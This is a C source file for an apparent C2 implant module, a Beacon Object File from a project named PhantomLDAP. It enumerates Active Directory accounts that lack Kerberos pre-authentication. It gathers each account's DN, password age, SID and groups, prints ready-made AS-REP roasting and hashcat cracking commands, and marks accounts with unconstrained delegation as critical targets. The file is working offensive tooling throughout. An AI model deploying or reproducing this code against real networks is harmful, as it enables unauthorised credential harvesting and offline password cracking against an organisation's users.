/**
 * @file enum_asrep.c
 * @brief PhantomLDAP BOF — Enumerate AS-REP Roastable accounts.
 *
 * Finds accounts with the DONT_REQUIRE_PREAUTH flag in userAccountControl.
 * These accounts can be targeted with AS-REP Roasting: an attacker requests
 * a Kerberos AS-REP without pre-authentication, receiving an encrypted blob
 * that can be cracked offline without any credential.
 *
 * UAC bit: 0x00400000 = DONT_REQUIRE_PREAUTH
 * LDAP OID filter: userAccountControl:1.2.840.113556.1.4.803:=4194304
 *
 * @author  PhantomLDAP Project
 * @version 1.0.0
 */

#include "../../include/phantom_ldap.h"

#define MODULE_TAG   "ASREP-ENUM"
#define MODULE_TITLE "AS-REP Roastable Account Discovery"

static PWSTR g_attrs[] = {
    L"sAMAccountName",
    L"distinguishedName",
    L"userAccountControl",
    L"pwdLastSet",
    L"lastLogon",
    L"memberOf",
    L"description",
    L"objectSid",
    NULL
};

static BOOL enum_asrep_callback(PPHANTOM_CONTEXT ctx, PLDAPMessage entry, PVOID user_data) {
    (void)user_data;
    PPHANTOM_LDAP_API api = &ctx->api;

    PWSTR *sam_vals   = NULL;
    PWSTR *dn_vals    = NULL;
    PWSTR *uac_vals   = NULL;
    PWSTR *pwd_vals   = NULL;
    PWSTR *logon_vals = NULL;
    PWSTR *desc_vals  = NULL;
    PWSTR *members    = NULL;
    PLDAP_BERVAL *sid_vals = NULL;

    char sam_str[128] = {0};
    char dn_str[512]  = {0};
    char uac_str[256] = {0};
    char pwd_str[48]  = {0};
    char pwd_age[48]  = {0};
    char logon_str[48] = {0};
    char sid_str[185] = {0};

    ctx->total_found++;

    sam_vals = api->ldap_get_values(ctx->ldap_handle, entry, ATTR_SAM_ACCOUNT_NAME);
    if (sam_vals && sam_vals[0]) phantom_wstr_to_str(sam_vals[0], sam_str, sizeof(sam_str));

    dn_vals = api->ldap_get_values(ctx->ldap_handle, entry, ATTR_DISTINGUISHED_NAME);
    if (dn_vals && dn_vals[0]) phantom_wstr_to_str(dn_vals[0], dn_str, sizeof(dn_str));

    DWORD uac_val = 0;
    uac_vals = api->ldap_get_values(ctx->ldap_handle, entry, ATTR_USER_ACCOUNT_CTRL);
    if (uac_vals && uac_vals[0]) {
        PWSTR w = uac_vals[0];
        while (*w >= L'0' && *w <= L'9') { uac_val = uac_val * 10 + (DWORD)(*w - L'0'); w++; }
        phantom_decode_uac(uac_val, uac_str, sizeof(uac_str));
    }

    LONGLONG pwd_ft = 0;
    pwd_vals = api->ldap_get_values(ctx->ldap_handle, entry, ATTR_PWD_LAST_SET);
    if (pwd_vals && pwd_vals[0]) {
        PWSTR w = pwd_vals[0];
        while (*w >= L'0' && *w <= L'9') { pwd_ft = pwd_ft * 10 + (LONGLONG)(*w - L'0'); w++; }
        phantom_filetime_to_str(pwd_ft, pwd_str, sizeof(pwd_str));
        phantom_filetime_to_age(pwd_ft, pwd_age, sizeof(pwd_age));
    }

    LONGLONG logon_ft = 0;
    logon_vals = api->ldap_get_values(ctx->ldap_handle, entry, ATTR_LAST_LOGON);
    if (logon_vals && logon_vals[0]) {
        PWSTR w = logon_vals[0];
        while (*w >= L'0' && *w <= L'9') { logon_ft = logon_ft * 10 + (LONGLONG)(*w - L'0'); w++; }
        phantom_filetime_to_str(logon_ft, logon_str, sizeof(logon_str));
    }

    sid_vals = api->ldap_get_values_len(ctx->ldap_handle, entry, ATTR_OBJECT_SID);
    if (sid_vals && sid_vals[0])
        phantom_sid_to_string((BYTE *)sid_vals[0]->bv_val,
                              (DWORD)sid_vals[0]->bv_len, sid_str, sizeof(sid_str));

    /* Output */
    phantom_print_separator('-');
    BeaconPrintf(CALLBACK_OUTPUT,
        "[!] AS-REP Roastable #%lu: %s\n",
        (unsigned long)ctx->total_found, sam_str);
    phantom_print_kv("DN",        dn_str,  4);
    phantom_print_kv("UAC",       uac_str, 4);

    if (pwd_ft == 0) {
        phantom_print_kv("Pwd Set", "NEVER SET", 4);
    } else {
        char combined[96];
        char *p = combined, *e = combined + sizeof(combined) - 1;
        for (const char *s = pwd_str; *s && p<e;) *p++ = *s++;
        *p++ = ' '; *p++ = '(';
        for (const char *s = pwd_age; *s && p<e;) *p++ = *s++;
        *p++ = ')'; *p = '\0';
        phantom_print_kv("Pwd Set", combined, 4);
    }

    phantom_print_kv("Last Logon", logon_ft ? logon_str : "Never", 4);
    if (sid_str[0]) phantom_print_kv("SID", sid_str, 4);

    /* Group membership */
    members = api->ldap_get_values(ctx->ldap_handle, entry, ATTR_MEMBER_OF);
    if (members) {
        ULONG cnt = api->ldap_count_values(members);
        for (ULONG i = 0; i < cnt && i < 6; i++) {
            char grp[256] = {0};
            phantom_wstr_to_str(members[i], grp, sizeof(grp));
            if (i == 0) phantom_print_kv("Member Of", grp, 4);
            else        BeaconPrintf(CALLBACK_OUTPUT, "                                    %s\n", grp);
        }
    }

    /* Attack paths */
    BeaconPrintf(CALLBACK_OUTPUT,
        "    [*] Attack (Linux): GetNPUsers.py %ls/ -usersfile users.txt -no-pass -format hashcat\n"
        "    [*] Attack (Win):   Rubeus.exe asreproast /user:%s /format:hashcat /nowrap\n"
        "    [*] Crack:         hashcat -m 18200 hash.txt rockyou.txt\n",
        ctx->base_dn, sam_str);

    if (uac_val & UAC_TRUSTED_FOR_DELEGATION)
        BeaconPrintf(CALLBACK_OUTPUT,
            "    [!!] UNCONSTRAINED DELEGATION + AS-REP = CRITICAL TARGET!\n");

cleanup:
    if (sam_vals)   api->ldap_value_free(sam_vals);
    if (dn_vals)    api->ldap_value_free(dn_vals);
    if (uac_vals)   api->ldap_value_free(uac_vals);
    if (pwd_vals)   api->ldap_value_free(pwd_vals);
    if (logon_vals) api->ldap_value_free(logon_vals);
    if (desc_vals)  api->ldap_value_free(desc_vals);
    if (members)    api->ldap_value_free(members);
    if (sid_vals)   api->ldap_value_free_len(sid_vals);

    return TRUE;
}

void go(char *args, int len) {
    PHANTOM_CONTEXT ctx    = {0};
    datap           parser = {0};
    WCHAR           dc_name[256] = {0};
    char           *dc_arg = NULL;
    int             dc_len  = 0;

    BeaconDataParse(&parser, args, len);
    dc_arg = BeaconDataExtract(&parser, &dc_len);
    if (dc_arg && dc_len > 0 && dc_arg[0] != '\0')
        for (int i = 0; i < dc_len && i < 255; i++)
            dc_name[i] = (WCHAR)(unsigned char)dc_arg[i];

    phantom_print_banner();
    phantom_print_header(MODULE_TITLE, MODULE_TAG);

    if (!phantom_ldap_init(&ctx, dc_name[0] ? dc_name : NULL, FALSE, 0)) {
        BeaconPrintf(CALLBACK_ERROR, "[!] PhantomLDAP: LDAP init failed.\n");
        goto cleanup;
    }

    BeaconPrintf(CALLBACK_OUTPUT,
        "[*] Searching for accounts with DONT_REQUIRE_PREAUTH (UAC=0x%08X)\n"
        "[*] Base DN: %ls\n\n",
        UAC_DONT_REQUIRE_PREAUTH, ctx.base_dn);

    phantom_ldap_paged_search(&ctx, ctx.base_dn, LDAP_SCOPE_SUBTREE,
                               FILTER_ASREP_ACCOUNTS, g_attrs,
                               enum_asrep_callback, NULL);

    if (ctx.total_found == 0)
        BeaconPrintf(CALLBACK_OUTPUT,
            "[*] No AS-REP Roastable accounts found (Kerberos pre-auth enforced).\n");

    phantom_print_footer(&ctx);

cleanup:
    phantom_ldap_cleanup(&ctx);
}
